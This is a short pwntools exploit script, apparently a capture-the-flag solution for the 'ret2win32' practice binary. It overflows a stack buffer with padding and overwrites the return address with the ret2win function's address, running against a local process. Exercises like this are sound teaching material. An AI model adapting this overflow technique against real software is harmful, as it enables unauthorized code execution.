#!/usr/bin/env python3

# Title:        XXX.py
# Description:  X
# Author:       bluecosmo

from pwn import *

elf = context.binary = ELF("./ret2win32")
p = process(elf.path)

payload = b"A" * (0x28 + 0x4) # buffer + ebp
payload += p32(elf.symbols["ret2win"])

p.sendline(payload)
p.interactive()
